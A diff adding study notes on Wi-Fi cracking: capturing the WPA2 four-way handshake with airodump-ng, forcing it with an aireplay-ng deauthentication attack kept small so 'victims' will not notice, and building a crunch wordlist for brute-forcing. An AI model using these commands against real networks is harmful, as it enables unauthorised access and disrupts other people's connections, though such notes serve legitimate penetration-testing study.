@@ -275,3 +275,29 @@ cmd in terminal 1 -> reaver --bssid target_network_bssid --channel channel_no --
 // which u can use to connect to network
 cmd in terminal 2 -> aireplay-ng --fakeauth 30 -a target_network_bssid -h MAC_address_of_my_wirless_adapter wlan0 
 // here we r mentioning 30 so that we can associate with the target network every 30 seconds
+
+On WPA2 the keys r unique they r temporary they r much longer then WEP, theirfore the packet sent in air contain no information that
+is usefull for us, So even if we capture 1 million packets we can't use them to crack the key, the only packets that contain the usefull
+information r the handshake packets, these r 4 packets transfered between a client and router when the client connects to the network
+
+Capture Handshake packets ->
+cmd in terminal 1 -> airodump-ng --bssid target_network_bssid --channel channel_no --write file_name wlan0
+// we have to wait know as the handshake is sent when the client connects to the network so we have to sit down and wait untill a new
+// client connect to the network and we will get a msg that the handshake is captured, alternatively we can use a deauthentication
+// attack so we can disconnect a client from a network and then the clint will automatically connect once we stop the attack, and while
+// connecting the handshake will be sent in air and we will capture it
+cmd in terminal 2 -> aireplay-ng --deauth 4 -a router_MAC_address -c client_MAC_address wlan0 // here we r writing or sending only 4
+// packets so that the victims cannot be able to feel that they r even being disconnected
+// On terminal 1 on right top corner we will receive the 'WPA handshake' as an output when terminal 2 cmd execution is done
+
+Handshake does not contain the information that can help us to recover or recalculate the WPA key, the information in it can only be
+used to check whether the password is valid or not, So we r going to create a wordlist which is a big text file that contains a large
+no. of passwords, then go through this file go through the passwords one by one and use them with the handshake in order to check that
+whether this password is valid or not
+
+Creating a Wordlist ->
+Cruch tool can be used to create wordlist
+Syntax -> crunch min_charters_for_passwrd max_charters_for_passwrd characters_to_be_used -t pattern -o file_name
+//-t is usefull when u know some of the characters of the password
+Ex -> crunch 6 8 123abc$ -t a@@@@b -o wordlist
+cmd -> man crunch // for the manual
